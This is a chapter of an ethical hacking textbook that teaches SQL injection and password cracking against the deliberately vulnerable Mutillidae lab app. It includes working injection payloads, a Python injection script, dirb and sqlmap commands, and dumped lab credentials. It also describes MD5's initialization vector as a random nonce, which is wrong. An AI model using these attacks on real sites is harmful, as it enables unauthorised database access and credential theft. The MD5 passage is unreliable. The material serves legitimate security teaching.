<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch12"><span epub:type="pagebreak" id="page_245"/><strong><span class="big">12</span><br/>STEALING AND CRACKING PASSWORDS</strong></h2>
		<p class="verse"><em>For the want of a nail the shoe was lost, For the want of a shoe the horse was lost, For the want of a horse the rider was lost, For the want of a rider the battle was lost, For the want of a battle the kingdom was lost, And all for the want of a horseshoe-nail.</em></p>
		<p class="chap-au">–Benjamin Franklin</p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">Hackers often compromise websites and APIs by finding ways to inject their own code. This chapter will introduce you to one of these techniques, called SQL injection, and you will use it to extract a database of usernames and passwords from a web server. As a security measure, servers often store hashes of the passwords instead of plaintext passwords. We’ll explore multiple ways of cracking these hashes to recover the original text, and then use tools to automate the process of logging into a service with each stolen username-password pair.</p>
		<p class="indent">In the process, you’ll learn a little bit about how hash functions work and how browsers craft HTTP requests.</p>
		<h3 class="h3" id="ch12lev1"><span epub:type="pagebreak" id="page_246"/><strong>SQL Injection</strong></h3>
		<p class="noindent"><em>SQL injection</em> vulnerabilities occur when developers incorrectly process user input and use it to generate <em>structured query language (SQL)</em> queries. SQL is a programming language used to add, retrieve, or change information in a database. For example, in a database that stores users’ personal information, the following query might return the first and last name of the user whose social security number is 555-55-5555 (this number is fake):</p>
		<pre>SELECT firstname, lastname FROM Users WHERE SSN = '555-55-5555';</pre>
		<p class="indent">A complete introduction to SQL syntax is beyond the scope of this book, but SQL databases are essentially organized into tables, each of which consists of columns and rows. Each column has a name (such as <code>firstname</code>) and type (such as <code>TEXT</code>).</p>
		<p class="indent">The query shown here, called a <code>SELECT</code> query, is designed to retrieve data from a table. <code>SELECT</code> queries have three parts, called <em>clauses</em>: <code>SELECT</code>, <code>FROM</code>, and <code>WHERE</code>. The <code>SELECT</code> clause specifies the list of columns you’d like to retrieve. In this example, we’re retrieving the <code>firstname</code> and <code>lastname</code> columns. The <code>FROM</code> clause specifies the name of the table from which we’ll retrieve the data. Lastly, the <code>WHERE</code> clause specifies the attributes of the rows we want to retrieve. For example, <code>WHERE SSN='555-55-5555'</code> will retrieve rows that have the value <code>'555-55-5555'</code> in their <code>SSN</code> column.</p>
		<p class="indent">Of course, programmers rarely write these queries manually. Instead, they write programs that can generate these queries whenever needed. Thus, to allow for more generic queries, a programmer might replace the hardcoded social security number with a variable such as <code>$id</code>:</p>
		<pre>SELECT firstname, lastname FROM Users WHERE SSN = '$id';</pre>
		<p class="indent">Replacing the fixed value with a variable allows a program to easily fill in missing information to generate queries. The query will now return the first and last names of records associated with any <code>$id</code> value the user supplies. You may find queries like these embedded within all sorts of apps. For example, a customer service agent might retrieve someone’s information by entering their social security number into the text box in a banking app.</p>
		<p class="indent">However, because the program inserts the social security number directly into the SQL query, attackers can use the text box to insert any value they’d like to query, including their own SQL commands, instead of the string the command expects. For example, imagine an attacker enters the following:</p>
		<pre>'UNION SELECT username, password FROM Users WHERE '1' = '1</pre>
		<p class="indent">The web app will replace the <code>$id$</code> value with the hacker’s entry, and because the entry contains SQL code, the database will execute the following query.</p>
		<pre><span epub:type="pagebreak" id="page_247"/>SELECT firstname, lastname FROM Users WHERE SSN = '<span class="codestrong1">'</span><br/><span class="codestrong1">UNION</span><br/><span class="codestrong1">SELECT username, password FROM Users WHERE '1' = '1</span>';</pre>
		<p class="indent">This query selects the <code>firstname</code> and <code>lastname</code> fields from the <code>Users</code> table if the user’s <code>SSN</code> field is empty. The <code>UNION</code> command then joins this value with the second query’s result, which the attacker supplied as user input. This query returns the usernames and passwords for all entries given that they all match the requirement (<code>'1' = '1'</code> is always true).</p>
		<p class="indent">Notice how carefully crafted the injected SQL command is. In particular, it starts and ends with a single quote (<code>'</code>). This is necessary because the SQL database will execute only valid queries, so we must ensure that it remains valid even after the injection. By including <code>'</code> before the <code>UNION</code> keyword, we close the previous query. Later we include another <code>'</code> at the end of the injected command to ensure that the trailing quotation mark left over from the original query is closed.</p>
		<p class="indent">SQL injection belongs to a broader class of attacks called <em>injection</em> attacks, in which attackers rely on user input to sneak their code into an application. Many web apps sanitize input to remove characters associated with injection attacks. For instance, they might replace quote characters ( <code>'</code> ) with <code>\'</code>, a process called <em>escaping</em>. This means that you often must craft your injections cleverly. The Open Web Application Security Project (OWASP) has a cheat sheet on ways to prevent injection attacks at <em><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</a></em>.</p>
		<h3 class="h3" id="ch12lev2"><strong>Stealing Passwords from a Website’s Database</strong></h3>
		<p class="noindent">To practice performing SQL injection, activate the <em>Mutillidae</em> web app on your Metasploitable virtual machine. Adrian Crenshaw and Jeremy Druin designed Mutillidae to showcase common web vulnerabilities, and it comes preinstalled on your Metasploitable server. However, you must configure it first. Log in to Metasploitable with the username <strong>msfadmin</strong> and password <strong>msfadmin</strong>, and then edit the <em>config.inc</em> file, which you can access with the following command:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">sudo vim /var/www/mutillidae/config.inc</span><br/>
&lt;?php<br/>
         ...<br/>
         $dbhost = 'localhost';<br/>
         $dbuser = 'root';<br/>
         $dbpass = '';<br/>
      <span class="ent">➊</span> $dbname = 'owasp10';<br/>
?&gt;</pre>
		<p class="indent">Change the <code>$dbname$</code> variable <span class="ent">➊</span> from <code>metasploitable</code> to <code>owasp10</code>. This directs Mutillidae to use the vulnerable owasp10 database instead of the Metasploitable database.</p>
		<h4 class="h4" id="ch12lev3"><span epub:type="pagebreak" id="page_248"/><strong><em>Enumerating Reachable Files on the Web Server</em></strong></h4>
		<p class="noindent">Configuration files like the one you just edited often store the usernames and passwords that web apps need to communicate with a database or other backend services. If these files have incorrect access permissions, an attacker could read them and extract credentials. For example, WordPress websites store database credentials in the <em>wp-config.php</em> file. Suppose this file had incorrect access permissions, making it publicly available. In that case, anyone on the internet could read it by entering the following URL in their web browser: <em>http://&lt;Word-press-url&gt;/wp-config.php</em>.</p>
		<p class="indent">If you don’t already know the name of the file you’re looking for, or want to check for the existence of multiple possible files, you can use tools like <code>dirb</code> to list files in a website’s directory. This tool attempts to find the web directory’s files using a list of preselected words to generate possible URLs. It takes a list of preselected keywords like <code>wp-config.php</code>, <code>config.in</code>, and <code>config.php</code>, and checks if those files are readable by generating and attempting to access the following URLs:</p>
		<pre>http://&lt;web-app-url.com&gt;/ wp-config.php<br/>http://&lt;web-app-url.com&gt;/ config.in<br/>http://&lt;web-app-url.com&gt;/ config.php</pre>
		<p class="indent">If a page doesn’t exist on the server, it will return a 404 error. However, if a page exists, the tool adds it to the list of reachable pages. Attacks that use lists of preselected words are often called <em>dictionary-based attacks</em>. This attack pattern is common, and we’ll see it used again later in the chapter.</p>
		<p class="indent">You can execute this dictionary-based directory-listing attack against the Metasploitable server by opening a terminal on your Kali Linux virtual machine and running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">dirb http://&lt;METASPLOITABLE-IP&gt;/mutillidae</span><br/><br/>
-----------------<br/>DIRB v2.22<br/>By The Dark Raver<br/>
--<span class="codeitalic">snip</span>--<br/>GENERATED WORDS: 4612<br/><br/>
---- Scanning URL: http://192.168.1.112/mutillidae/ ----<br/>
 ==&gt; DIRECTORY: http://192.168.1.112/mutillidae/classes/<br/>
+ http://192.168.1.112/mutillidae/credits (CODE:200|SIZE:509)</pre>
		<h4 class="h4" id="ch12lev4"><strong><em>Performing SQL Injection</em></strong></h4>
		<p class="noindent">Now open a web browser on your Kali Linux machine and navigate to the Mutillidae web app at <em>http://&lt;METASPLOITABLE-IP&gt;/mutillidae/</em>.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_249"/>Mutillidae is intentionally vulnerable, so it includes multiple common vulnerabilities. Click <strong>OWASP Top 10</strong> ▶ <strong>Injection</strong> ▶ <strong>SQLi Extract Data</strong> ▶ <strong>User Info</strong>. You should see the login screen shown in <a href="ch12.xhtml#ch12fig1">Figure 12-1</a>.</p>
		<div class="image" id="ch12fig1">
			<img alt="image" src="../images/ch12fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-1: Mutillidae login screen</em></p>
		<p class="indent">OWASP is a web security research group that publishes an annual list of the year’s top 10 web vulnerabilities, nicknamed the OWASP Top 10. (If you plan on auditing websites, it’s a good idea to read this list and familiarize yourself with these vulnerabilities.) Also check that the security level of your app is set to level 0, which disables Mutillidae’s defense.</p>
		<p class="indent">Now it’s time to test your SQL injection skills. Before reading ahead, try generating a SQL injection query of your own that extracts all the usernames and passwords from the site’s database. Enter your queries in the password field on the login page. As you test different injected queries, look at the error messages Mutillidae generates. Reading these error messages will help you hone your query. For example, you might write a query that tries to read the <code>users</code> table. However, if this table doesn’t exist, you’ll get the following message:</p>
		<pre>Error executing query: Table 'owasp10.users' doesn't exist</pre>
		<p class="indent">You won’t always be this lucky; some systems only generate generic error messages. Injection attacks that succeed against these systems are often called <em>blind injection attacks</em> because attackers can’t immediately see whether they failed. To get around this limitation, attackers often rely on discrepancies in query execution time to determine if it executed correctly.</p>
		<p class="indent">After you’ve practiced trying your own queries, try querying the <code>accounts</code> table. The following injection code should extract the usernames and passwords of the 16 users in the database:</p>
		<pre>' UNION SELECT * FROM accounts where '' ='<br/><br/><br/>Username=kevin<br/><span epub:type="pagebreak" id="page_250"/>Password=42<br/>Signature=Doug Adams rocks<br/><br/><br/>Username=dave<br/>Password=set Signature=Bet<br/>on S.E.T. FTW</pre>
		<p class="indent">As you can see, the injected query was successfully unioned with the result of the existing query, which allowed you to extract all the fields from the <code>accounts</code> table. I’ve opted to show only a portion of the data returned.</p>
		<h3 class="h3" id="ch12lev5"><strong>Writing Your Own SQL Injection Tool</strong></h3>
		<p class="noindent">After you’ve gotten the hang of the mechanisms of SQL injection, try writing a Python program to automate the injection process. Our program will simulate submitting the website’s login form by emulating the HTTP request sent by the browser; therefore, this project will require basic knowledge of how the HTTP protocol works. So let’s start by discussing HTTP.</p>
		<h4 class="h4" id="ch12lev6"><strong><em>Understanding HTTP Requests</em></strong></h4>
		<p class="noindent">Whenever a user interacts with a website, their browser transforms their action into an <em>httP request</em> and sends it to the web server. An HTTP request contains the name of the resource the user is requesting and data the user is sending to the server. The server responds with <em>httP response</em> messages containing the HTML or binary data that the user requested. These responses are then parsed and displayed to the user.</p>
		<p class="indent">To generate an HTTP request, you’ll first need to understand their structure. For accuracy, let’s use Wireshark to capture and inspect the exact HTTP request your browser generates when you submit the Mutillidae login form with the username “test” and password “abcd.” (Return to <a href="ch03.xhtml#ch3">Chapter 3</a> for a refresher on monitoring traffic with Wireshark.)</p>
		<p class="indent">Start monitoring the Ethernet (<code>eth0</code>) interface and then submit the login form to generate the request. Once submitted, use a filter to select packets containing the Metasploitable server’s IP and then select the <strong>follow stream</strong> option. Your request should look something like this:</p>
		<pre><span class="ent">➊</span> <span class="codestrong1">GET</span> /mutillidae/index.php?page=user-info.php&amp;<span class="ent">➋</span> <span class="codestrong1">username=test&amp;password=abcd&amp;...</span><br/>
   <span class="codestrong1">Host:</span> 192.168.1.101<br/>
   <span class="codestrong1">User-Agent:</span> Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 /68.0<br/>
   <span class="codestrong1">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>
   <span class="codestrong1">Accept-Language:</span> en-US,en;q=0.5<br/>
   <span class="codestrong1">Accept-Encoding:</span> gzip, deflate<br/>
   <span class="codestrong1">Referer:</span> http://192.168.1.101/mutillidae/index.php?page=user-info.php.....<br/>
   <span class="codestrong1">Connection:</span> keep-alive<br/><br/><span epub:type="pagebreak" id="page_251"/><span class="ent">➌</span> <span class="codestrong1">Cookie:</span> PHPSESSID=3e726056cf963b43bd87036e378d07be<br/>
   <span class="codestrong1">Upgrade-Insecure-Requests:</span> 1<br/><span class="ent">➍</span></pre>
		<p class="indent">As you can see, the HTTP request has multiple fields. The first field <span class="ent">➊</span> represents the type of request being sent. Web forms commonly use either <code>GET</code> or <code>POST</code> requests. A <code>GET</code> request encodes the user’s input data in the URL as <em>query string parameters</em>, which are variables included at the end of a URL <span class="ent">➋</span>. The <code>?</code> operator denotes the beginning of the query string parameters, and each parameter is separated by a <code>&amp;</code> operator. In this request, the username and password values are included as query string parameters in the request sent to the server. However, if a form uses a <code>POST</code> request, the user’s data is placed in the request’s body, which, if present, would appear at <span class="ent">➍</span>.</p>
		<p class="indent">To determine whether a form will generate a <code>GET</code> or <code>POST</code> request without submitting it, you can inspect a page’s source code by right-clicking the page and selecting <strong>View Page Source</strong>. A quick search for the <code>method=</code> keyword should return the code for the form. For example, the Mutillidae login form’s code looks like this:</p>
		<pre>&lt;form action="./index.php?page=user-info.php"<br/>
      <span class="codestrong1">method="GET"</span><br/>
      enctype="application/x-www-form-urlencoded" &gt;</pre>
		<p class="indent">This tells us the form will generate a <code>GET</code> request.</p>
		<p class="indent">Let’s continue looking at the HTTP request. The next header, <code>HOST</code>, identifies the web server to which you’re sending the request. In this case, <code>192.168.1.101</code> is the IP address of the server containing the page. The <code>User-Agent</code> header identifies the browser. Here, I have used the Mozilla Firefox browser on a <code>64-bit</code> Linux machine. Next, the <code>Accept</code> field specifies the format, language, and compression (encoding) types the browser accepts.</p>
		<p class="indent">The <code>Referer</code> field contains the previous page you visited before navigating to the current page. Many websites log this value to identify the source of their traffic. (Although some fields, like <code>HOST</code>, are required, other fields, like <code>Referer</code>, are optional. Thus, you might not see them in other requests.) The <code>Connection</code> field specifies the connection type, and the <code>keep-alive</code> option instructs the server to keep the TCP connection open, allowing it to accept multiple requests.</p>
		<p class="indent">The <code>Cookie</code> field <span class="ent">➌</span> contains any cookies that the server has sent to the browser. The HTTP protocol is stateless, meaning it assumes that each request is made independently of all others. Therefore, the protocol doesn’t remember any previous requests you sent. That’s why the <code>Cookie</code> field lets programs like web servers track and collate a user’s interaction with the site even if the protocol doesn’t. When a user first visits a website, the server might assign that user a unique number to serve as a cookie. The server uses this unique number to authenticate the user and correctly process their web requests, as it will assume all HTTP requests that contain the same cookie belong to the same user. Each time the user sends a web request, the browser checks the cookie value. It’s like saying, “Hey web server, remember me? <span epub:type="pagebreak" id="page_252"/>Here is the ID you gave me: <code>PHPSESSID=3e726056cf963b43bd87036e378d07be</code>”. If an attacker steals this cookie, they may be able to impersonate a victim and access their web sessions.</p>
		<p class="indent">The final <code>Upgrade-Insecure-Requests</code> field asks the web server to upgrade the connection to an encrypted HTTPS connection if possible. (This packet was captured from an unencrypted connection with the Metasploitable server.) Now that we have seen that Mutillidae’s credentials are sent to the server in query string parameters, we will inject our SQL payload in the same way.</p>
		<h4 class="h4" id="ch12lev7"><strong><em>Writing the Injection Program</em></strong></h4>
		<p class="noindent">Our Python program will send an HTTP request similar to the one we just reviewed, except that it will contain our SQL injection payload as a query parameter. Create a new Desktop folder called <em>injections</em> on your Kali Linux machine. Create a new file called <em>sql_injection.py</em> in that folder and then copy the following into it:</p>
		<pre>import socket<br/>import argparse<br/>import urllib.parse<br/><br/>def get_request(HOST, URL, parameter, SQL_injection, COOKIE):<br/>
    injection_encoded = urllib.parse.quote_plus(SQL_injection)<br/>
 <span class="ent">➊</span> request = ("GET "+ URL.replace(parameter+"=",parameter+"="<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 +injection_encoded) +"\r\n"<br/>
                "Host: "+HOST+"\r\n"<br/>
                "User-Agent: Mozilla/5.0 \r\n"<br/>
                "Accept: text/html,application/xhtml+xml,application/xml \r\n"<br/>
                "Accept-Language: en-US,en;q=0.5 \r\n"<br/>
                "Connection: keep-alive \r\n"<br/>
                "Cookie: "+COOKIE+" \r\n")<br/><br/>
    return request<br/><br/>def main():<br/>
 <span class="ent">➋</span> parser = argparse.ArgumentParser()<br/>
    parser.add_argument('--host', help='IP-address of server')<br/>
    parser.add_argument('-u', help='URL')<br/>
    parser.add_argument('--param', help='Query String Parameter')<br/>
    parser.add_argument('--cookie', help='Session Cookie')<br/>
    args = parser.parse_args()<br/>
    HOST = args.host<br/>
    URL = args.u<br/>
    PARAMETER = args.param<br/>
    COOKIE = args.cookie<br/>
    SQL_injection = '\'UNION SELECT * FROM accounts where \'1\'=\'1'<br/>
    PORT = 80<br/><br/>
    <span epub:type="pagebreak" id="page_253"/>with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:<br/>
        tcp_socket.connect((HOST, PORT))<br/>
        request = get_request(HOST, URL, PARAMETER, SQL_injection, COOKIE)<br/>
        print(request)<br/>
     <span class="ent">➌</span> tcp_socket.sendall(request.encode())<br/>
        while True:<br/>
            data = tcp_socket.recv(1024)<br/>
            print(data)<br/>
            if not data:<br/>
                break<br/><br/>main()</pre>
		<p class="indent">We define a function called <code>get_request()</code> that returns an HTTP request containing the information we pass in as parameters. We replace the query parameter’s value with the SQL injection query <span class="ent">➊</span>. We must encode the query because we’re injecting it directly into the URL, which can’t contain spaces or certain special characters. The <code>urllib</code> library URL-encodes our SQL injection query before adding it to the URL. This encoding process will, for example, convert all spaces to the character sequence <code>%20</code>.</p>
		<p class="indent">When we’ve provided it with all the variables, the function will return the HTTP request, which we’ll send through a TCP socket <span class="ent">➌</span>. Although not necessary, consider using the <code>argparse</code> library <span class="ent">➋</span> to parse the command line arguments. This will add a professional touch to your command line tools. The <code>argparse</code> library allows you to add custom flags and a help menu.</p>
		<p class="indent">Run the following command to test your new SQL injection tool:</p>
		<pre>kali@kali:~/Desktop/injection$ <span class="codestrong1">sudo python3 sql_injection.py --host="</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">192.168.1.112" -u="/mutillidae/index.php?page=user-info.php&amp;username=&amp;</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">password=&amp;user-info-php-submit-button=View+Account+Details" --param="</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">password" --cookie="PHPSESSID=3e726056cf963b43bd87036e378d07b"</span><br/><span class="codestrong1">GET /mutillidae/index.php?page=user-info.php&amp;username=&amp;password=+%27UNION+</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">SELECT+%2A+FROM+accounts+where+%271%27%3D%271&amp;user-info-php-submit-</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">button=View+Account+Details</span><br/>Host: 192.168.1.112<br/>User-Agent: Mozilla/5.0<br/>Accept: text/html,application/xhtml+xml,application/xml<br/>Accept-Language: en-US,en;q=0.5<br/>Connection: keep-alive<br/>Cookie: PHPSESSID=3e726056cf963b43bd87036e378d07b<br/><br/>
...<br/>
16 records found.&lt;p&gt;&lt;b&gt;Username=&lt;/b&gt;admin&lt;br&gt;&lt;b&gt;Password=&lt;/b&gt;adminpass&lt;br&gt;&lt;b&gt;<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 Signature=&lt;/b&gt;Monkey!&lt;br&gt;&lt;p&gt;&lt;b&gt;Usern'<br/>b'ame=&lt;/b&gt;adrian&lt;br&gt;&lt;b&gt;Password=&lt;/b&gt;somepassword&lt;br&gt;&lt;b&gt;Signature=&lt;/b&gt;Zombie<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 Films Rock!&lt;br&gt;&lt;p&gt;&lt;b&gt;Username=&lt;/b&gt;john&lt;br&gt;&lt;b&gt;Password=&lt;/b&gt;monkey&lt;br&gt;&lt;b<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 &gt;Signature=&lt;/b&gt;I like the smell of confunk&lt;br&gt;&lt;p&gt;&lt;b&gt;Username=&lt;/b&gt;<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span epub:type="pagebreak" id="page_254"/>jeremy&lt;br&gt;&lt;b&gt;Password=&lt;/b&gt;password&lt;br&gt;&lt;b&gt;Signature=&lt;/b&gt;d1373 1337<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 speak</pre>
		<p class="indent">The script prints the request and the server’s HTML response. The preceding example shows a snippet of the HTML response, which contains the username and password pairs. A great way to debug your script is to capture requests and responses in Wireshark.</p>
		<h3 class="h3" id="ch12lev8"><strong>Using SQLMap</strong></h3>
		<p class="noindent">We just built our own SQL injection tool, but existing tools can do much more than ours. One of the most popular SQL injections tools, called <em>SQLmap</em>, can automate the process of discovering and exploiting SQL injection vulnerabilities. Let’s perform another injection attack on the Mutillidae web app. Open a new terminal in Kali Linux and run the following command to start the SQLmap shell (it should be preinstalled on Kali Linux):</p>
		<pre>kali@kali:~$ <span class="codestrong1">sqlmap -u "http://&lt;Metasploitable-IP&gt;/mutillidae/index.php?page=</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">user-info.php&amp;username=&amp;password=&amp;" --sqlmap-shell</span><br/><br/>sqlmap-shell&gt;</pre>
		<p class="indent">The <code>-u</code> option specifies the URL of the web pages we’re targeting. Here we passed it the Mutillidae login page we attacked earlier in this chapter.</p>
		<p class="indent">Within the shell, enter <code>--dbs</code>. This will list all databases on the system:</p>
		<pre>   sqlmap-shell&gt; <span class="codestrong1">--dbs</span><br/><br/>
   [16:16:04] [INFO] testing connection to the target URL<br/><span class="ent">➊</span> you have not declared cookie(s), while server wants to set its own ('PHPSESSID<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 =724251ceeec...19e0ca7aeb'). Do you want to use those [Y/n] :<span class="codestrong1">Y</span><br/>
   ...<br/>
   Parameter: username (GET)<br/>
       Type: boolean-based blind<br/>
       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 comment)<br/>
    <span class="ent">➋</span> Payload: page=user-info.php&amp;username='OR NOT 6675=6675#&amp;password=&amp;user-<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 info-php-submit-button=View Account Details<br/>
   ...<br/>
   [16:16:06] [INFO] fetching database names<br/><span class="ent">➌</span> available databases [7]:<br/>
   [*] dvwa<br/>
   [*] information_schema<br/>
   [*] metasploit<br/>
   [*] mysql<br/><span class="ent">➍</span> [*] owasp10<br/>
   [*] tikiwiki<br/>
   [*] tikiwiki195</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_255"/><code>SQLmap</code> first connects to the server and gets a fresh cookie <span class="ent">➊</span>. Then, it uses the payload <code>' OR NOT 6675=6675#</code> <span class="ent">➋</span> to test whether the query string parameter is vulnerable to SQL injection. Here, the <code>#</code> comments out the remainder of the SQL query. Lastly, <code>SQLmap</code> injects a query that returns list of databases on the server <span class="ent">➌</span>. You can see that there are seven databases.</p>
		<p class="indent">Now we know this database server is hosting several databases. Let’s focus on exploring the owasp10 database <span class="ent">➍</span>, which is the one we’ve been attacking. Run the following command to list all of this database’s tables. The <code>-D</code> flag lets you select a particular database and <code>--tables</code> lists all of its tables:</p>
		<pre>sqlmap-shell&gt; <span class="codestrong1">-D owasp10 --tables</span><br/>
[17:02:24] [INFO] fetching tables for database: 'owasp10'<br/>Database: owasp10<br/>
[6 tables]<br/>
+----------------+<br/>
| accounts       |<br/>
| blogs_table    |<br/>
| captured_data  |<br/>
| credit_cards   |<br/>
| hitlog         |<br/>
| pen_test_tools |<br/>
+----------------+</pre>
		<p class="indent">This command returned six tables. The table <code>accounts</code> looks particularly interesting as it sounds like it might contain user information. Let’s view its contents. Use the <code>-T</code> flag to select a specific table and the <code>--dump</code> option to dump (display) the table’s contents to the terminal. If you don’t include the <code>--dump</code> option, SQLmap will write the table’s contents to a file, instead:</p>
		<pre>sqlmap-shell&gt;-<span class="codestrong1">D owasp10 -T accounts --dump</span><br/><br/>Table: accounts<br/>
[16 entries]<br/>
+-----+----------+----------+--------------+-----------------------------+<br/>
| cid | is_admin | username | password     | mysignature                 |<br/>
+-----+----------+----------+--------------+-----------------------------+<br/>
...<br/>
| 11  | FALSE    | scotty   | password     | Scotty Do                   |<br/>
| 12  | FALSE    | cal      | password     | Go Wildcats                 |<br/>
| 13  | FALSE    | john     | password     | Do the Duggie!              |<br/>
| 14  | FALSE    | kevin    | 42           | Doug Adams rocks            |<br/>
| 15  | FALSE    | dave     | set          | Bet on SET FTW              |<br/>
| 16  | FALSE    | ed       | pentest      | Commandline KungFu anyone?  |<br/>
+-----+----------+----------+--------------+-----------------------------+</pre>
		<p class="indent">The output shows the data contained in the accounts table. There are five columns: <code>cid</code>, <code>is_admin</code>, <code>username</code>, <code>password</code>, and <code>mysignature</code>. There are also 16 rows of data. I snipped the top rows to save space.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_256"/>You might think developers could have protected these passwords by encrypting them. The engineering team at Adobe thought they could protect passwords this way, too. But what happens if someone steals your encryption key, or simply guesses it? As part of the Adobe password breach in 2013, hackers stole and decrypted more than 150 million usernames and passwords.</p>
		<p class="indent">Ideally, websites should store passwords in a form that makes it infeasible for either admins or attackers to recover the plaintext password. Instead of encrypting passwords, software developers often use a one-way function like a hash. In the next section, we’ll look at hash functions and discuss how hackers crack them. I’ll explain why you should select long passwords with uppercase and lowercase letters and symbols.</p>
		<p class="indent">Keep the SQLmap terminal open; you’ll use it in the next section.</p>
		<h3 class="h3" id="ch12lev9"><strong>Hashing Passwords</strong></h3>
		<p class="noindent">We introduced hashes and hash functions in <a href="ch06.xhtml#ch6">Chapter 6</a>, and although we didn’t discuss them in detail, they’re very useful. Instead of storing plaintext passwords, database administrators often store a hash of the passwords to provide additional security. It’s worth taking a closer look at some fundamental properties of hash functions and how hackers can crack them.</p>
		<p class="indent">The first property of a hash function is that it is a <em>one-way function</em>. This means that, given the output, it is infeasible to find the input. You can think of hash functions as being analogous to a digital blender. Once a message is blended, it’s impossible to recover the original message from the blended results. <a href="ch12.xhtml#ch12fig2">Figure 12-2</a> shows the results of hashing two strings.</p>
		<div class="image" id="ch12fig2">
			<img alt="image" src="../images/ch12fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-2: The hashes of two strings</em></p>
		<p class="indent">The second important property of hashes is that it’s time consuming to find two inputs that hash to the same output. By time consuming, I mean that when the hash function is secure, it would take longer than the universe’s age to find two inputs that hash to the same value. If two inputs hash to the same value, this is called a <em>collision</em>. We estimate it will take 36 trillion years to find a collision for the SHA-256 hash function. To put this number in perspective, the universe is only 13.8 billion years old.</p>
		<p class="indent">Because collisions are so rare, developers often treat a message’s hash as its digital fingerprint: a unique identifier of that message. This is why system administrators can use hashes to represent passwords without storing the original password. If a user logs into a system, their password is hashed <span epub:type="pagebreak" id="page_257"/>and compared to the hash in the database. The plaintext password is never stored.</p>
		<p class="indent">The third property of a hash function is that, regardless of the input size, it always produces a fixed-size output. Long and short passwords will result in hashes of the same length. (You might already be wondering: Why do we need long passwords if all hashes are the same length? It’s because longer passwords are still more difficult to crack. To see why, skip ahead to the “Cracking Hashes” section of this chapter.)</p>
		<h4 class="h4" id="ch12lev10"><strong><em>The Anatomy of the MD5 Hash</em></strong></h4>
		<p class="noindent">If you’re curious about hash function design, here is a brief discussion on the MD5 hash function’s inner workings. Let’s look at the heart of our blender.</p>
		<p class="indent">The MD5 hash function operates on 512-bit blocks. The first 448 bits of this block contain the message that is being hashed, and the last 64 bits are the message’s length. If the message is shorter, the bits are padded with a one followed by zeros. If the message is longer than 448 bits, it is split into multiple blocks. <a href="ch12.xhtml#ch12fig3">Figure 12-3</a> shows how these 512 bits are then scrambled.</p>
		<div class="image" id="ch12fig3">
			<img alt="image" src="../images/ch12fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-3: The building blocks of the MD5 hash</em></p>
		<p class="indent">First, a 128-bit random number (a nonce) is used the create an initialization vector. The 128-bit initialization vector is then divided into four 32-bit blocks: <em>A</em>, <em>B</em>, <em>C</em>, and <em>D</em>. The mixing process begins by using a function (labeled <em>F</em> in <a href="ch12.xhtml#ch12fig3">Figure 12-3</a>) that combines the random values of <em>B</em>, <em>C</em>, and <em>D</em> to produce another 32-bit value. The formula for <em>F</em> is shown here:</p>
		<p class="center"><em>F</em>(<em>B</em>, <em>C</em>, <em>D</em>) = (<em>B</em> <strong>and</strong> <em>C</em>) <strong>or</strong> (( <strong>not</strong> <em>B</em>) <strong>and</strong> <em>D</em>)</p>
		<p class="indent"><span epub:type="pagebreak" id="page_258"/>The output of this function gets fed to a function <em>K</em>, which combines it with 32 bits of the original message (<em>M<sub>i</sub></em>), a 32-bit constant (<em>T<sub>i</sub></em>), and the 32 bits in <em>A</em>. The <em>i</em> value represents a specific iteration. Only 32 bits of the 512-bit message are processed at a time. Following is the formula for the function <em>K</em>:</p>
		<p class="center"><em>K</em>(<em>B</em>, <em>M</em>, <em>T</em>, <em>A</em>, <em>F</em>) = <em>B</em> <span class="ent">⊞</span> ((<em>A</em> <span class="ent">⊞</span> <em>F</em> <span class="ent">⊞</span> <em>M<sub>i</sub></em> <span class="ent">⊞</span> <em>T<sub>i</sub></em>) &lt;&lt;&lt; <em>s<sub>i</sub></em>)</p>
